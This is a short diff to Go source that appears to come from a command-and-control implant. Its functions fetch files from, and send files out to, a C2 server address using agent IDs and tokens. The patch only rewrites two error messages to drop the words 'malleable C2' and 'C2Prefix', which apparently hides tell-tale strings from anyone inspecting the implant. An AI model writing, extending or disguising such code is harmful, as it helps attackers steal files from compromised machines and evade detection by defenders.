@@ -63,7 +63,7 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 	wwwPath := common.RuntimeConfig.WWWPath
 	prefix := common.RuntimeConfig.C2Prefix
 	if prefix == "" || wwwPath == "" {
-		return nil, fmt.Errorf("missing malleable C2 config: C2Prefix=%q WWWPath=%q", prefix, wwwPath)
+		return nil, fmt.Errorf("missing server config: Prefix=%q WWWPath=%q", prefix, wwwPath)
 	}
 	downloadURL := netutil.JoinURL(def.CCAddress, prefix, wwwPath, url.QueryEscape(config.AgentUUID)) +
 		"?file_to_download=" + url.QueryEscape(file_to_download)
@@ -216,7 +216,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	ftpPath := common.RuntimeConfig.FTPPath
 	prefix := common.RuntimeConfig.C2Prefix
 	if prefix == "" || ftpPath == "" {
-		err = fmt.Errorf("missing malleable C2 config: C2Prefix=%q FTPPath=%q", prefix, ftpPath)
+		err = fmt.Errorf("missing server config: Prefix=%q FTPPath=%q", prefix, ftpPath)
 		return
 	}
 	url := netutil.JoinURL(def.CCAddress, prefix, ftpPath, token)
